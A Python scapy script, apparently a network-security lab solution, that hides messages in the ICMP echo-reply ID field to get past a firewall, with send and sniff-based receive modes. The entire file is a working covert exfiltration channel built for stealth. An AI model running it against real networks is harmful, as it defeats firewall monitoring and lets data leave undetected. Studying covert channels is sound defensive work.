"""
The transmission of messages happens through the ICMP ID field to bypass the firewall.
The ID is 2 bytes, therefore messages are fragmented and sent max. 2 bytes at a time.
Libraries used: scapy (included in the host containers). Encryption is not implemented (optional).
"""
from scapy.all import IP, ICMP, send, sniff
from sys import argv
import sys
import time

# The message is encoded as valid UTF-8 text, which never produces the 0xFF byte, so a real 2-byte chunk
# cannot produce ICMP id=0xFFFF; we reserve it as an end-of-message marker.
END_ID = 0xFFFF
END_SEQ = 0xFFFF

def send_mode(receiver_ip: str, message: str):
    message_bytes = message.encode('utf-8')

    for seq, i in enumerate(range(0, len(message_bytes), 2)):
        byte_1 = message_bytes[i]
        byte_2 = message_bytes[i+1] if i+1 < len(message_bytes) else 0

        # concatenate bytes
        packet_id = (byte_1 << 8) | byte_2

        # type 0 (= echo reply) for stealthiness (no further echo)
        # length 28 is allowed by the firewall
        packet = IP(dst=receiver_ip) / ICMP(type=0, code=0, id=packet_id, seq=seq)
        send(packet, verbose=False)
        time.sleep(0.05)

    end_packet = IP(dst=receiver_ip) / ICMP(type=0, code=0, id=END_ID, seq=END_SEQ)
    send(end_packet, verbose=False)

def receive_mode():
    message_bytes = []

    def stop_filter(packet):
        return(
            ICMP in packet
            and packet[ICMP].type == 0
            and packet[ICMP].id == END_ID
            and packet[ICMP].seq == END_SEQ
        )

    def packet_callback(packet):
        if ICMP not in packet or packet[ICMP].type != 0:
            return

        if stop_filter(packet):
            return

        packet_id = packet[ICMP].id
        # shift right + bitwise AND with 255 (11111111)
        byte_1 = (packet_id >> 8) & 0xFF
        byte_2 = packet_id & 0xFF

        message_bytes.append(byte_1)
        if byte_2 != 0:
            message_bytes.append(byte_2)

    try:
        sniff(filter="icmp[0]=0", prn=packet_callback, store=False, stop_filter=stop_filter)
    except KeyboardInterrupt:
        pass

    message = bytes(message_bytes).decode('utf-8', errors='ignore').rstrip('\0')
    print(message)

def main():
    if len(argv) < 2:
        sys.exit(1)
    if argv[1] == 'send':
        if len(argv) != 4:
            sys.exit(1)
        send_mode(argv[2], argv[3])
    elif argv[1] == 'receive':
        if len(argv) != 2:
            sys.exit(1)
        receive_mode()
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()